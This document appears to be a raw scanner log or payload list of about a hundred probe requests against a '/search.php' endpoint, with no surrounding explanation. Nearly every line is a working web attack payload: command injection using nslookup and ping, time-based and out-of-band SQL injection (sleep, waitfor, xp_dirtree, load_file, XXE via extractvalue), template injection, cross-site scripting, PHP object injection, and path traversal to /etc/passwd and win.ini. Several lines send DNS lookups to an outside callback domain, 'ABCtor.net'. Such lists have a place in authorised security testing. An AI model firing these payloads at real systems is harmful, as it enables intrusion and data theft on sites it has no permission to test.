+    119 /search.php'"`0&nslookup -q=cname qysfxehvsah8iz7tw80izkawrnxgl693xuphf54.ABCtor.net.&`'?
+    120 /search.php"|echo jb5il08mt6 h2pbzjs944 ||?
+    121 /search.php"|ping -n 21 127.0.0.1 ||?
+    122 /search.php"?
+    123 /search.php%}n1a9z'/"<h1pab?
+    124 /search.php&echo hliikcb72l 0xemi7sqek&?
+    125 /search.php&nslookup -q=cname yprnom83ji8g97y1ngrqqs14ivooce09o0gn6bv.ABCtor.net.&'\"`0&nslookup -q=cname yprnom83ji8g97y1ngrqqs14ivooce09o0gn6bv.ABCtor.net.&`'?
+    126 /search.php&ping -n 21 127.0.0.1&?
+    127 /search.php'+eval(compile('for x in range(1):\n import time\n time.sleep(20)','a','single'))+'?
+    128 /search.php'+(function(){if(typeof oeoya==="undefined"){var a=new Date();do{var b=new Date();}while(b-a<20000);oeoya=1;}}())+'?
+    129 /search.php'+(select load_file('\\\\je18d7xo83x1ysnmc1gbfdqp7gd91zpqsej66wul.ABCtor.net\\dlj'))+'?
+    130 /search.php'+(select*from(select(sleep(20)))a)+'?
+    131 /search.php'+sleep(20.to_i)+'?
+    132 /search.php',0)waitfor delay'0:0:20'--?
+    133 /search.php,(select*from(select(sleep(20)))a)?
+    134 /search.php;declare @q varchar(99);set @q='\\1prqop86jl8j9ay4njrtqv17iyorch08qwho4es3.ABC'+'tor.net\ami'; exec master.dbo.xp_dirtree @q;-- ?
+    135 /search.php);declare @q varchar(99);set @q='\\fl44k34kfz4x5ouijxn7m9xleck58vwmoaf22sqh.ABC'+'tor.net\psc'; exec master.dbo.xp_dirtree @q;-- ?
+    136 /search.php';declare @q varchar(99);set @q='\\j4o837noy3n1osdm216b5dgpxg39rzfq6ex6kw8l.ABC'+'tor.net\gbk'; exec master.dbo.xp_dirtree @q;-- ?
+    137 /search.php');declare @q varchar(99);set @q='\\ykmnjm33ei3g47t1igmqlsw4dvjo7ev5otfl2bq0.ABC'+'tor.net\sav'; exec master.dbo.xp_dirtree @q;-- ?
+    138 /search.php>
+    BCC:0pqpoo85jk8i99y3nirsqu16ixoqcg08uwlo8ew3@ABCtor.net
+    dbd: s?
+    139 /search.php]]>><?
+    140 /search.php51505449' or '5738'='5745?
+    141 /search.php54335499' or 5152=5152-- ?
+    142 /search.php..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\windows\win.ini?
+    143 /search.php..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\winnt\win.ini?
+    144 /search.php62828572' or '2562'='2562?
+    145 /search.php{${sleep(20)}}?
+    146 /search.php'||(select extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % jdkdd SYSTEM "http://r91g8fsw3bs9t0iu79bjallx2o8hw7kb820pqdf.ABC'||'tor.net/">%jdkdd;]>'),'/l') from dual)||'?
+    147 /search.php'|echo 0t6opcrw54 q0dgngpxvx #xzwx?
+    148 /search.php|echo vm67vrr509 paauvu1wni||a #' |echo vm67vrr509 paauvu1wni||a #|" |echo vm67vrr509 paauvu1wni||a #?
+    149 /search.php|nslookup -q=cname 0qrppo95kk9ia9z3oissru26jxpqdg1cp3hq7ew.ABCtor.net.&?
+    150 /search.php'|ping -c 21 127.0.0.1 #?
+    151 /search.php|ping -c 21 127.0.0.1||x?
+    152 /search.php|ping -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #' |ping -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #\" |ping -n 21 127.0.0.1?
+    153 /search.php}}u0uqf'/"<diyf4?
+    154 /search.php.7z?
+    155 /search.php87550038' or 8600=8605-- ?
+    156 /search.php.ar?
+    157 /search.php.a?
+    158 /search.php.backup?
+    159 /search.php_backup?
+    160 /search.php.bac?
+    161 /search.php.bak?
+    162 /search.php_bak?
+    163 /search.phpbak?
+    164 /search.php.bz2?
+    165 /search.php/c0tnd7/?
+    166 /search.php.cbz?
+    167 /search.php/e4j13${532*581}vbhc3?
+    168 /search.php.ear?
+    169 /search.php../../../../../../../../../../../../../../../../etc/passwd?
+    170 /search.php/eval(compile('for x in range(1):\n import time\n time.sleep(20)','a','single'))?
+    171 /search.php.exe?
+    172 /search.php/(function(){if(typeof hfh8n==='undefined'){var a=new Date();do{var b=new Date();}while(b-a<20000);hfh8n=1;}}())?
+    173 /search.php/gm1dtd69l5?
+    174 /search.php.gz?
+    175 /search.phpinc?
+    176 /search.php.jar?
+    177 /search.php/javascript:/*</script><img/onerror='-/"/-/ onmouseover=1/-/[`*/[]/[(new(Image)).src=(/;/+/vbakaju05fudv4ky9ddncpn14salybm3dr7ez2oX;.ABCtor.net/).replace(/.;/g,[])]//'src=>?
+    178 /search.php.lzma?
+    179 /search.php/me9k8{{510*618}}p4zrk?
+    180 /search.php;/o04luz/?
+    181 /search.php/O:3:"PDO":0:{}?
+    182 /search.php.old?
+    183 /search.php_old?
+    184 /search.phpold?
+    185 /search.php.rar?
+    186 /search.phpreex3%>v84wn'/"<js11v?
+    187 /search.php/(select extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % mlogq SYSTEM "http://i9s786sn32s0tril70baaclo2f88wyk18vvnjc.ABC'||'tor.net/">%mlogq;]>'),'/l') from dual)?
+    188 /search.php/(select load_file('\\\\g0h5z4jlu0jykp9jyy281acmtdz6nwbndb7yzmo.ABCtor.net\\qhj'))?
+    189 /search.php'(select*from(select(sleep(20)))a)'?
+    190 /search.php/(select*from(select(sleep(20)))a)?
+    191 /search.php'.sleep(20).'?
+    192 /search.php.tar.7z?
+    193 /search.php.tar.bz2?
+    194 /search.php.tar.gz?
+    195 /search.php.tar.lzma?
+    196 /search.php.tar?
+    197 /search.php.tar.xz?
+    198 /search.php'?
+    199 /search.php?
+    200 /search.php~?
+    201 /search.php/TzozOiJQRE8iOjA6e30=?
+    202 /search.php')waitfor delay'0:0:20'--?
+    203 /search.php.war?
+    204 /search.php.wim?
+    205 /search.php../../../../../../../../../../../../../../../../windows/win.ini?
+    206 /search.php../../../../../../../../../../../../../../../../winnt/win.ini?
+    207 /search.php.xz?
+    208 /search.phpykrnoo74qi?
+    209 /search.php.zip?
+    210 /search.rar?
+    211 /search.tar.7z?
+    212 /search.tar.bz2?
+    213 /search.tar.gz?
+    214 /search.tar.lzma?
+    215 /search.tar?
+    216 /search.tar.xz?
+    217 /search.war?
+    218 /search.wim?
+    219 /search.xz?
+    220 /search.zip?
+    221 /(select extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % jdkdd SYSTEM "http://xyzmxlh2shhfi670wf0pzra3ruxnld9gx7pufi4.ABC'||'tor.net/">%jdkdd;]>'),'/l') from dual)?
+    222 /(select load_file('\\\\o9yd8cst38s6txir76bgailu2l8ew4kvmjdb01oq.ABCtor.net\\hdk'))?
+    223 /TzozOiJQRE8iOjA6e30=?
+    224 /v6kpf{{160*492}}f8k5y?
+    225 /../../../../../../../../../../../../../../../../windows/win.ini?
+    226 /../../../../../../../../../../../../../../../../winnt/win.ini?
